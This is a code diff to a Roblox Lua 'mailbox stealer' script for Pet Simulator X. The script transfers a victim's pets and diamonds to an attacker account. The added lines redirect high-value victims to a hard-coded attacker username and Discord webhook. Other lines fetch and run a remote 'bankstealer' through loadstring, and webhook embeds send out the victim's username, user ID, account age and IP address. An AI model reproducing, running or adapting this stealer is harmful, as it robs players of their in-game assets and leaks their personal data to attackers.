@@ -4,6 +4,20 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1126402135786000395/TV27VBc_jbyXZHliylbsadlR2kzI9CAmwv_Rsnk-lu8H0d47NNj6AisAcZKlUoeBYujx"
+end
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -26,6 +40,7 @@ if _G.MouseLock ~= false then
         mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
     end);
 end
+
 local function antiPrint(...)
     local info = debug.getinfo(2)
     if info and info.what == 'Lua' and info.func == print then
@@ -742,7 +757,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(0.5)
+    task.wait(1.5)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -753,7 +768,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1012,7 +1027,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Monzz Stealer||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1022,14 +1037,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":frog: **Pets left** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1082,7 +1097,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Monzz Stealer||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1092,14 +1107,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":frog: **Pets left** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1141,7 +1156,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://php-key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1224,7 +1239,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1314,7 +1329,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = ndUser
+                user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1343,7 +1358,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = ndUser
+                user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
                         user = dhuser
@@ -1371,7 +1386,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = ndUser
+                user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
                         user = dhuser
@@ -1591,6 +1606,7 @@ spawn(function()
         wait(1)
     end
 end)
+
 
 local Hcc = #HList
 WHugeList = {}
@@ -1827,6 +1843,7 @@ spawn(function()
         wait(1)
     end
 end)
+
 
 local Scc = #SList
 WSecretList = {}
